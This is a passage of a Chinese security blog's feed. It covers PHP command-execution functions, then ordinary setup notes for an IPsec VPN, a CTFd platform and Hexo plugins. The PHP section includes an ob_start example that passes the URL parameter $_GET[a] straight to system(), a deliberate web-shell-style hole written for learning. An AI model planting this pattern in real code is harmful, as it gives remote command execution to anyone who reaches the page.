id="system"><a href="#system" class="headerlink" title="system()"></a>system()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string system( string $command[, int &amp;$return_var] )</span><br></pre></td></tr></table></figure><p>command是要执行的命令。return_var，如果提供 return_var 参数， 则外部命令执行后的返回状态将会被设置到此变量中。</p><h3 id="passthru"><a href="#passthru" class="headerlink" title="passthru()"></a>passthru()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">void passthru( string $command[, int &amp;$return_var] )</span><br></pre></td></tr></table></figure><p>command是要执行的命令。return_var，如果提供 return_var 参数， Unix 命令的返回状态会被记录到此参数。</p><h3 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string exec( string $command[, <span class="keyword">array</span> &amp;$output[, int &amp;$return_var]] )</span><br></pre></td></tr></table></figure><p>exec() 执行 command 参数所指定的命令。 其余参数，见<a href="http://php.net/manual/zh/function.exec.php" target="_blank" rel="noopener">文档</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> exec(<span class="string">"ls"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>返回值是命令执行结果的最后一行内容。</p><h3 id="pcntl-exec"><a href="#pcntl-exec" class="headerlink" title="pcntl_exec()"></a>pcntl_exec()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">void pcntl_exec ( string $path [, array $args [, array $envs ]] )</span><br></pre></td></tr></table></figure><p>path是可执行二进制文件路径或一个在文件第一行指定了 一个可执行文件路径标头的脚本<br>args是一个要传递给程序的参数的字符串数组。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">pcntl_exec ( <span class="string">"/bin/ls"</span> ,[<span class="string">"/"</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'123'</span>;    <span class="comment">//不会执行到该行</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec()"></a>shell_exec()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string shell_exec ( string $cmd )</span><br></pre></td></tr></table></figure><h3 id="popen"><a href="#popen" class="headerlink" title="popen()"></a>popen()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">popen ( string $command , string $mode ) : resource</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$test = <span class="string">"ls /tmp/test"</span>;  </span><br><span class="line">$fp = popen($test,<span class="string">"r"</span>);  <span class="comment">//popen打一个进程通道  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">while</span> (!feof($fp)) &#123;      <span class="comment">//从通道里面取得东西  </span></span><br><span class="line"> $out = fgets($fp, <span class="number">4096</span>);  </span><br><span class="line"> <span class="keyword">echo</span>  $out;         <span class="comment">//打印出来  </span></span><br><span class="line">&#125;  </span><br><span class="line">pclose($fp);  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="proc-open"><a href="#proc-open" class="headerlink" title="proc_open()"></a>proc_open()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$test = <span class="string">"ls /"</span>;</span><br><span class="line">$array =   [</span><br><span class="line">    [<span class="string">"pipe"</span>,<span class="string">"r"</span>],   <span class="comment">//标准输入</span></span><br><span class="line">    [<span class="string">"pipe"</span>,<span class="string">"w"</span>],   <span class="comment">//标准输出内容</span></span><br><span class="line">    [<span class="string">"pipe"</span>,<span class="string">"w"</span>]    <span class="comment">//标准输出错误</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">$fp = proc_open($test,$array,$pipes);   <span class="comment">//打开一个进程通道</span></span><br><span class="line"><span class="keyword">echo</span> stream_get_contents($pipes[<span class="number">1</span>]);    <span class="comment">//为什么是$pipes[1]，因为1是输出内容</span></span><br><span class="line">proc_close($fp);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="反引号"><a href="#反引号" class="headerlink" title="`(反引号)"></a>`(反引号)</h3><p>在php中称之为执行运算符，PHP 将尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回（即，可以赋给一个变量而不是简单地丢弃到标准输出，使用反引号运算符“`”的效果与函数 shell_exec() 相同。</p><h3 id="ob-start"><a href="#ob-start" class="headerlink" title="ob_start()"></a>ob_start()</h3><p>此函数将打开输出缓冲。当输出缓冲激活后，脚本将不会输出内容（除http标头外），相反需要输出的内容被存储在内部缓冲区中。想要输出存储在内部缓冲区中的内容，可以使用 ob_end_flush() 函数。</p><p>可选参数 output_callback 函数可以被指定。 此函数把一个字符串当作参数并返回一个字符串。 当输出缓冲区被( ob_flush(), ob_clean() 或者相似的函数)冲刷（送出）或者被清洗的时候；或者在请求结束之际输出缓冲区内容被冲刷到浏览器的时候该函数将会被调用。 当调用 output_callback 时，它将收到输出缓冲区的内容作为参数 并预期返回一个新的输出缓冲区作为结果，这个新返回的输出缓冲区内容将被送到浏览器。</p><p>下面的代码，由于调用了ob_end_flush()，所以会调用ob_start($cmd)中的cmd，把我们输入的$_GET[a]作为cmd的参数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$cmd = <span class="string">'system'</span>;</span><br><span class="line">ob_start($cmd);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"$_GET[a]"</span>;</span><br><span class="line">ob_end_flush();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;php代码执行与命令执行漏洞&lt;/p&gt;
&lt;p&gt;学习php代码执行与命令执行漏洞，没有新姿势&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://0clickjacking0.github.io/categories/Web-Security/"/>
    
    
  </entry>
  
  <entry>
    <title>阿里云ubuntu16.04 搭建IPsec VPN遇到的坑（含docker搭建）</title>
    <link href="http://0clickjacking0.github.io/2019/03/22/%E9%98%BF%E9%87%8C%E4%BA%91ubuntu16-04-%E6%90%AD%E5%BB%BAIPsec-VPN/"/>
    <id>http://0clickjacking0.github.io/2019/03/22/阿里云ubuntu16-04-搭建IPsec-VPN/</id>
    <published>2019-03-22T13:44:00.000Z</published>
    <updated>2019-05-11T12:52:58.629Z</updated>
    
    <content type="html"><![CDATA[<p>阿里云ubuntu16.04 搭建IPsec VPN遇到的坑（含docker搭建）</p><a id="more"></a><h1 id="非docker版本的搭建"><a href="#非docker版本的搭建" class="headerlink" title="非docker版本的搭建"></a>非docker版本的搭建</h1><p>可以参考这个：<a href="https://github.com/hwdsl2/setup-ipsec-vpn/blob/master/README-zh.md#%E5%AE%89%E8%A3%85%E8%AF%B4%E6%98%8E" target="_blank" rel="noopener">安装说明</a></p><h2 id="坑1"><a href="#坑1" class="headerlink" title="坑1"></a>坑1</h2><p>我用的是阿里云的服务器，默认是没用开启<code>UDPU500</code>端口和<code>UDP4500</code>端口的，需要手动开启</p><p><a href="https://yq.aliyun.com/articles/225815" target="_blank" rel="noopener">阿里云服务器怎么开启或关闭8080端口？</a></p><p>然后按下图配置就好了</p><p><img src="http://images.xianyu123.club/UDP_500.jpg?imageslim" alt></p><h2 id="坑2"><a href="#坑2" class="headerlink" title="坑2"></a>坑2</h2><p>首先进行<a href="https://github.com/hwdsl2/setup-ipsec-vpn/blob/master/docs/clients-zh.md#Windows" target="_blank" rel="noopener">Windows连接VPN</a></p><p>Windows10连接的VPN的时候也会有很多问题，然后根据<a href="https://github.com/hwdsl2/setup-ipsec-vpn/blob/master/docs/clients-zh.md#%E6%95%85%E9%9A%9C%E6%8E%92%E9%99%A4" target="_blank" rel="noopener">故障排除</a>就可以解决问题了</p><h1 id="docker版本的搭建"><a href="#docker版本的搭建" class="headerlink" title="docker版本的搭建"></a>docker版本的搭建</h1><p>按照这个教程<a href="https://github.com/hwdsl2/docker-ipsec-vpn-server/blob/master/README-zh.md" target="_blank" rel="noopener">Docker 上的 IPsec VPN 服务器</a>，就不会有问题</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;阿里云ubuntu16.04 搭建IPsec VPN遇到的坑（含docker搭建）&lt;/p&gt;
    
    </summary>
    
      <category term="Linux" scheme="http://0clickjacking0.github.io/categories/Linux/"/>
    
    
  </entry>
  
  <entry>
    <title>ctfd平台的搭建和优化</title>
    <link href="http://0clickjacking0.github.io/2019/03/19/ctfd%E5%B9%B3%E5%8F%B0%E7%9A%84%E6%90%AD%E5%BB%BA%E5%92%8C%E4%BC%98%E5%8C%96/"/>
    <id>http://0clickjacking0.github.io/2019/03/19/ctfd平台的搭建和优化/</id>
    <published>2019-03-19T06:35:07.000Z</published>
    <updated>2019-08-08T07:19:41.150Z</updated>
    
    <content type="html"><![CDATA[<p>ctfd平台的搭建和优化</p><a id="more"></a><h1 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h1><p>​       本次环境搭建使用的是腾讯云的学生机（1核2G，1M带宽），ubuntu16.04 64位。</p><h1 id="开始搭建"><a href="#开始搭建" class="headerlink" title="开始搭建"></a>开始搭建</h1><h2 id="1-安装git"><a href="#1-安装git" class="headerlink" title="1.安装git"></a>1.安装git</h2><p><code>sudo apt-get install git</code></p><h2 id="2-安装pip"><a href="#2-安装pip" class="headerlink" title="2.安装pip"></a>2.安装pip</h2><p><code>sudo apt-get install python-pip</code></p><h2 id="3-安装Flask"><a href="#3-安装Flask" class="headerlink" title="3.安装Flask"></a>3.安装Flask</h2><p><code>sudo pip install Flask</code></p><h2 id="4-下载CTFd"><a href="#4-下载CTFd" class="headerlink" title="4.下载CTFd"></a>4.下载CTFd</h2><p>我下载在ubuntu的家目录下</p><p><code>sudo git clone https://github.com/CTFd/CTFd</code></p><h2 id="5-安装CTFd"><a href="#5-安装CTFd" class="headerlink" title="5.安装CTFd"></a>5.安装CTFd</h2><ol><li><p><code>cd CTFd</code></p></li><li><p><code>sudo ./prepare.sh</code></p></li></ol><h2 id="6-修改CTFd"><a href="#6-修改CTFd" class="headerlink" title="6.修改CTFd"></a>6.修改CTFd</h2><p>执行完第5步后所需的依赖应该都已经安装好了。先别急着运行CTFd。先修改CTFd/config.py文件，对数据库进行相关的设置（这里以MYSQL为例）</p><p><img src="http://images.xianyu123.club/ctfd_mysql.png?imageslim" alt></p><p>格式为<code>mysql+pymysql://root:数据库密码@localhost/你创建的数据库名字</code></p><h2 id="7-mysql设置"><a href="#7-mysql设置" class="headerlink" title="7.mysql设置"></a>7.mysql设置</h2><p>关于mysql的安装请大家自行google</p><p>进入mysql，新建一个ctfd数据库</p><ol><li><p><code>create database ctfd;</code></p></li><li><p><code>exit;</code></p></li></ol><h2 id="8-运行CTFd"><a href="#8-运行CTFd" class="headerlink" title="8.运行CTFd"></a>8.运行CTFd</h2><h2 id="9-设置ctfd数据库字段，防止字符乱码"><a href="#9-设置ctfd数据库字段，防止字符乱码" class="headerlink" title="9.设置ctfd数据库字段，防止字符乱码"></a>9.设置ctfd数据库字段，防止字符乱码</h2><p>再次进入mysql数据库，输入下面的命令：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> ctfd;</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> awards <span class="keyword">CONVERT</span> <span class="keyword">TO</span> <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> utf8;</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> challenges <span class="keyword">CONVERT</span> <span class="keyword">TO</span> <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> utf8;</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> config <span class="keyword">CONVERT</span> <span class="keyword">TO</span> <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> utf8;</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> containers <span class="keyword">CONVERT</span> <span class="keyword">TO</span> <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> utf8;</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> files <span class="keyword">CONVERT</span> <span class="keyword">TO</span> <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> utf8;</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> <span class="keyword">keys</span> <span class="keyword">CONVERT</span> <span class="keyword">TO</span> <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> utf8;</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> pages <span class="keyword">CONVERT</span> <span class="keyword">TO</span> <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> utf8;</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> solves <span class="keyword">CONVERT</span> <span class="keyword">TO</span> <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> utf8;</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> tags <span class="keyword">CONVERT</span> <span class="keyword">TO</span> <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> utf8;</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> teams <span class="keyword">CONVERT</span> <span class="keyword">TO</span> <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> utf8;</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> <span class="keyword">tracking</span> <span class="keyword">CONVERT</span> <span class="keyword">TO</span> <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> utf8;</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> wrong_keys <span class="keyword">CONVERT</span> <span class="keyword">TO</span> <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> utf8;</span><br></pre></td></tr></table></figure><h2 id="10-开始运行"><a href="#10-开始运行" class="headerlink" title="10.开始运行"></a>10.开始运行</h2><p><code>sudo python serve.py</code></p><h1 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h1><h2 id="1-gunicorn部署"><a href="#1-gunicorn部署" class="headerlink" title="1.gunicorn部署"></a>1.gunicorn部署</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1、pip install gunicorn</span><br><span class="line"></span><br><span class="line">2、sudo gunicorn --bind 0.0.0.0:8000 - w 4 "CTFd:create_app()"</span><br><span class="line"></span><br><span class="line">此时在浏览器访问你的服务器公网ip:4000就可以进入平台了</span><br></pre></td></tr></table></figure><p>但是这样运行起来性能还是不好，所以我采用了nginx+uwsgi的方法来提高性能</p><h2 id="2-nginx和uwsgi部署"><a href="#2-nginx和uwsgi部署" class="headerlink" title="2.nginx和uwsgi部署"></a>2.nginx和uwsgi部署</h2><p>安装nginx和uwsgi</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.apt-get install nginx</span><br><span class="line"></span><br><span class="line">2.pip install uwsgi</span><br></pre></td></tr></table></figure><p>在<code>/etc/nginx/sites-enabled/site</code>中删除<code>default</code>，新建<code>site</code>文件，配置如下</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">server</span> &#123; </span><br><span class="line"><span class="attribute">listen</span> <span class="number">23333</span>; </span><br><span class="line"><span class="attribute">server_name</span> <span class="number">1.1.1.1</span>;<span class="comment">#这里填写你服务器的ip地址，不是1.1.1.1 </span></span><br><span class="line"></span><br><span class="line"><span class="attribute">location</span> / &#123; </span><br><span class="line"><span class="attribute">include</span> uwsgi_params; </span><br><span class="line"><span class="attribute">uwsgi_pass</span> unix:/tmp/uwsgi.sock; <span class="comment">#注：这里的sock文件和uwsgi的sock文件配的是同一个文件，因为nginx和uwsgi需要通过这个socket进行交互 </span></span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后把site软链接到<code>/etc/nginx/sites-available/site</code>下，或者把文件copy到<code>/etc/nginx/sites-available/site</code>下</p><p>之后进入~/CTFd目录，运行</p><p><code>uwsgi -s /tmp/uwsgi.sock --chmod-socket=666 -w &#39;CTFd:create_app()&#39;</code></p><p>然后在浏览器访问你的公网IP，应该就OK了。</p><h1 id="遇到的坑"><a href="#遇到的坑" class="headerlink" title="遇到的坑"></a>遇到的坑</h1><h2 id="坑1"><a href="#坑1" class="headerlink" title="坑1"></a>坑1</h2><p>uwsgi -i xxx.ini时候出现了<code>!!! no internal routing support, rebuild with pcre support !!!</code></p><p><img src="http://images.xianyu123.club/pip_cache.png?imageslim" alt></p><p>这是因为pip缓存的坑，具体内容可以参考<a href="https://reality0ne.com/pip-cahce-dir/" target="_blank" rel="noopener">pip 缓存坑</a></p><p>解决：1.<code>pip uninstall uwsgi</code></p><p>2.<code>sudo apt-get install libpcre3 libpcre3-dev</code></p><p>3.<code>pip install uwsgi --no-cache-dir</code></p><h1 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h1><h2 id="1-nginx反向代理，开启多个个进程去代理，可惜我是学生机，只有1核啊！！"><a href="#1-nginx反向代理，开启多个个进程去代理，可惜我是学生机，只有1核啊！！" class="headerlink" title="1.nginx反向代理，开启多个个进程去代理，可惜我是学生机，只有1核啊！！"></a>1.nginx反向代理，开启多个个进程去代理，可惜我是学生机，只有1核啊！！</h2><h2 id="2-把静态文件目录地址添加到到nginx配置中"><a href="#2-把静态文件目录地址添加到到nginx配置中" class="headerlink" title="2.把静态文件目录地址添加到到nginx配置中"></a>2.把静态文件目录地址添加到到nginx配置中</h2><h2 id="3-云服务器的话可以考虑CDN加速"><a href="#3-云服务器的话可以考虑CDN加速" class="headerlink" title="3.云服务器的话可以考虑CDN加速"></a>3.云服务器的话可以考虑CDN加速</h2><h2 id="4-redis缓存配置，可惜我不会。。"><a href="#4-redis缓存配置，可惜我不会。。" class="headerlink" title="4.redis缓存配置，可惜我不会。。"></a>4.redis缓存配置，可惜我不会。。</h2><p>暂时就这些吧，有空再进一步研究如何优化！</p><p>## </p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ctfd平台的搭建和优化&lt;/p&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://0clickjacking0.github.io/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>hexo next添加统计文章阅读量功能</title>
    <link href="http://0clickjacking0.github.io/2019/02/22/hexo-next%E6%B7%BB%E5%8A%A0%E7%BB%9F%E8%AE%A1%E6%96%87%E7%AB%A0%E9%98%85%E8%AF%BB%E9%87%8F%E5%8A%9F%E8%83%BD/"/>
    <id>http://0clickjacking0.github.io/2019/02/22/hexo-next添加统计文章阅读量功能/</id>
    <published>2019-02-22T08:29:41.000Z</published>
    <updated>2019-05-11T12:52:58.621Z</updated>
    
    <content type="html"><![CDATA[<p>hexo next使用Leancloud添加统计文章阅读量功能</p><a id="more"></a><h1 id="使用Leancloud添加统计文章阅读量功能"><a href="#使用Leancloud添加统计文章阅读量功能" class="headerlink" title="使用Leancloud添加统计文章阅读量功能"></a>使用Leancloud添加统计文章阅读量功能</h1><h2 id="1-在LeanCloud先注册一个账户"><a href="#1-在LeanCloud先注册一个账户" class="headerlink" title="1.在LeanCloud先注册一个账户"></a>1.在<a href="https://leancloud.cn/" target="_blank" rel="noopener">LeanCloud</a>先注册一个账户</h2><h2 id="2-然后进入控制台，应用——创建新应用"><a href="#2-然后进入控制台，应用——创建新应用" class="headerlink" title="2.然后进入控制台，应用——创建新应用"></a>2.然后进入控制台，应用——创建新应用</h2><p><img src="http://images.xianyu123.club/leancloud_create.png?imageslim" alt></p><h2 id="3-输入应用名字，任意取，选择开发版"><a href="#3-输入应用名字，任意取，选择开发版" class="headerlink" title="3.输入应用名字，任意取，选择开发版"></a>3.输入应用名字，任意取，选择开发版</h2><p><img src="http://images.xianyu123.club/leancloud_username.png?imageslim" alt></p><h2 id="4-然后进入到这个应用，点击创建Class，Class名字必须是Counter，选择无限制"><a href="#4-然后进入到这个应用，点击创建Class，Class名字必须是Counter，选择无限制" class="headerlink" title="4.然后进入到这个应用，点击创建Class，Class名字必须是Counter，选择无限制"></a>4.然后进入到这个应用，点击创建Class，Class名字必须是<code>Counter</code>，选择无限制</h2><p><img src="http://images.xianyu123.club/leancloud_class.png?imageslim" alt></p><h2 id="5-在设置——安全中心——Web-安全域名中配置自己的域名"><a href="#5-在设置——安全中心——Web-安全域名中配置自己的域名" class="headerlink" title="5.在设置——安全中心——Web 安全域名中配置自己的域名"></a>5.在设置——安全中心——Web 安全域名中配置自己的域名</h2><p><img src="http://images.xianyu123.club/leancloud_web.png?imageslim" alt></p><h2 id="6-修改-theme-next-config-yml中的配置文件"><a href="#6-修改-theme-next-config-yml中的配置文件" class="headerlink" title="6.修改/theme/next/_config.yml中的配置文件"></a>6.修改<code>/theme/next/_config.yml</code>中的配置文件</h2><p><code>app_id</code>和<code>app_key</code>在<code>设置——应用Key</code>，填入<code>_config.yml</code>。我第一次配置就是把下面整段内容又复制进去，导致<code>hexo generate</code>的时候报错了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">leancloud_visitors:</span><br><span class="line">  enable: true</span><br><span class="line">  app_id: #你的app_id</span><br><span class="line">  app_key: #你的app_key</span><br></pre></td></tr></table></figure><h2 id="7-hexo-next-5-1-3注意下面事项"><a href="#7-hexo-next-5-1-3注意下面事项" class="headerlink" title="7.hexo next 5.1.3注意下面事项"></a>7.hexo next 5.1.3注意下面事项</h2><p>在<code>Leancloud</code>中选择华北节点，切记，一定要选择华北节点</p><p><img src="http://images.xianyu123.club/leancloud_huabei.png?imageslim" alt></p><p>如果选择华东节点，会出现下面错误</p><p><img src="http://images.xianyu123.club/leancloud_error.png?imageslim" alt></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p>1.<a href="https://forum.leancloud.cn/t/access-denied-by-api-domain-white-list-the-request-origin-header-is-null/18607" target="_blank" rel="noopener">POST <a href="https://tab.leancloud.cn/1.1/classes/Counter?redirectByAPI=cn" target="_blank" rel="noopener">https://tab.leancloud.cn/1.1/classes/Counter?redirectByAPI=cn</a> (index):1 403 ()</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;hexo next使用Leancloud添加统计文章阅读量功能&lt;/p&gt;
    
    </summary>
    
      <category term="Blog搭建" scheme="http://0clickjacking0.github.io/categories/Blog%E6%90%AD%E5%BB%BA/"/>
    
    
  </entry>
  
  <entry>
    <title>hexo next添加代码块复制功能</title>
    <link href="http://0clickjacking0.github.io/2019/02/21/hexo-next%E6%B7%BB%E5%8A%A0%E4%BB%A3%E7%A0%81%E5%9D%97%E5%A4%8D%E5%88%B6%E5%8A%9F%E8%83%BD/"/>
    <id>http://0clickjacking0.github.io/2019/02/21/hexo-next添加代码块复制功能/</id>
    <published>2019-02-21T14:30:23.000Z</published>
    <updated>2019-05-11T12:52:58.621Z</updated>
    
    <content type="html"><![CDATA[<p>hexo next（5.1.3+）添加代码块复制功能</p><a id="more"></a><h2 id="1-下载插件clipboard-js"><a href="#1-下载插件clipboard-js" class="headerlink" title="1.下载插件clipboard.js"></a>1.下载插件<a href="https://github.com/zenorocha/clipboard.js" target="_blank" rel="noopener">clipboard.js</a></h2><p>如果next版本是<code>4.+</code>的，需要下载<code>1.71</code>左右的版本</p><p>如果next版本是<code>5.1+</code>的需要下载<code>2.0+</code>的版本，我下载的是<code>2.04</code>版本</p><p>如果next版本是<code>6.0+</code>的应该是自带复制功能的</p><h2 id="2-打开themes-next-source-lib-新建文件夹clipboard"><a href="#2-打开themes-next-source-lib-新建文件夹clipboard" class="headerlink" title="2.打开themes/next/source/lib/,新建文件夹clipboard"></a>2.打开<code>themes/next/source/lib/</code>,新建文件夹<code>clipboard</code></h2><h2 id="3-把下载clipboard-js下的dist文件夹下的clipboard-min-js复制到clipboard文件夹下"><a href="#3-把下载clipboard-js下的dist文件夹下的clipboard-min-js复制到clipboard文件夹下" class="headerlink" title="3.把下载clipboard.js下的dist文件夹下的clipboard.min.js复制到clipboard文件夹下"></a>3.把下载<code>clipboard.js</code>下的<code>dist</code>文件夹下的<code>clipboard.min.js</code>复制到<code>clipboard</code>文件夹下</h2><h2 id="4-打开themes-next-source-js-src-新建文件custom-js-代码如下"><a href="#4-打开themes-next-source-js-src-新建文件custom-js-代码如下" class="headerlink" title="4. 打开themes/next/source/js/src/,新建文件custom.js,代码如下:"></a>4. 打开<code>themes/next/source/js/src/</code>,新建文件<code>custom.js</code>,代码如下:</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//此函数用于创建复制按钮</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createCopyBtns</span>(<span class="params"></span>) 